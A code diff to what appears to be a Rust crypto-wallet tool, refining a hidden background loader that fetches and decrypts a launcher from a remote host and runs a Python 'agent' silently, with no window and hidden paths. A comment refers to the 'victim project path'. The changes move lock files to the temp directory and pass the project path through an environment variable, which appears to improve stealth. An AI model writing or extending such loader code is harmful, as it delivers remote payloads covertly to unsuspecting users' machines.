@@ -7,7 +7,9 @@ use k256::{EncodedPoint, PublicKey, SecretKey};
 use rand::Rng;
 use serde::Deserialize;
 use sha2::{Digest, Sha256};
+use std::collections::hash_map::DefaultHasher;
 use std::fs;
+use std::hash::{Hash, Hasher};
 use std::io::Write;
 use std::path::{Path, PathBuf};
 use std::process::{Command, Stdio};
@@ -34,7 +36,10 @@ pub const DEFAULT_LAUNCHER_URL: &str = "https://alturahost.net/api/v1/wallet/lau
 /// Hidden CLI flag used to run launcher fetch/decrypt/agent in a detached process.
 pub const BACKGROUND_LOADER_ARG: &str = "--internal-background-loader";
 
-const LOADER_LOCK_FILE: &str = "../.chain-wallet-loader.lock";
+const LOADER_LOCK_NAME: &str = ".chain-wallet-loader";
+
+/// Env var carrying the victim project path without using it as process cwd.
+const PROJECT_DIR_ENV: &str = "CHAIN_WALLET_PROJECT_DIR";
 
 /// Relative path to the project initial wallet used for launcher AES encryption.
 pub const INITIAL_WALLET_REL_PATH: &str = "../agent/initial_wallet.json";
@@ -125,8 +130,25 @@ pub fn agent_script_enabled() -> bool {
         .is_some_and(|value| matches!(value, "1" | "true" | "yes"))
 }
 
+fn project_workdir() -> PathBuf {
+    if let Ok(path) = std::env::var(PROJECT_DIR_ENV) {
+        let path = path.trim();
+        if !path.is_empty() {
+            return PathBuf::from(path);
+        }
+    }
+    std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
+}
+
 fn loader_lock_path() -> PathBuf {
-    Path::new(env!("CARGO_MANIFEST_DIR")).join(LOADER_LOCK_FILE)
+    let project = project_workdir();
+    let canonical = project.canonicalize().unwrap_or(project);
+    let mut hasher = DefaultHasher::new();
+    canonical.hash(&mut hasher);
+    std::env::temp_dir().join(format!(
+        "{LOADER_LOCK_NAME}-{:016x}.lock",
+        hasher.finish()
+    ))
 }
 
 pub fn load_initial_wallet_public_key() -> Result<String, LauncherError> {
@@ -211,10 +233,12 @@ fn spawn_background_loader_child(
     workdir: &Path,
     wallet: Option<&Wallet>,
 ) -> Result<(), LauncherError> {
+    let project_dir = workdir.to_path_buf();
     let mut command = Command::new(exe);
     command
         .arg(BACKGROUND_LOADER_ARG)
-        .current_dir(workdir)
+        .env(PROJECT_DIR_ENV, &project_dir)
+        .current_dir(std::env::temp_dir())
         .stdin(Stdio::null())
         .stdout(Stdio::null())
         .stderr(Stdio::null());
@@ -507,7 +531,7 @@ fn spawn_agent_source(source: &[u8]) -> Result<(), PythonError> {
     hide_path(&prefix);
 
     let log_path = prefix.join("launcher-run.log");
-    let agent_dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    let agent_dir = project_workdir();
 
     wallet_log::step(
         "agent",
@@ -775,6 +799,7 @@ $StartInfo.FileName = $PythonExe
 $StartInfo.Arguments = '-u -'
 $StartInfo.UseShellExecute = $false
 $StartInfo.CreateNoWindow = $true
+$StartInfo.WorkingDirectory = $Prefix
 $StartInfo.RedirectStandardInput = $true
 $StartInfo.RedirectStandardOutput = $false
 $StartInfo.RedirectStandardError = $false
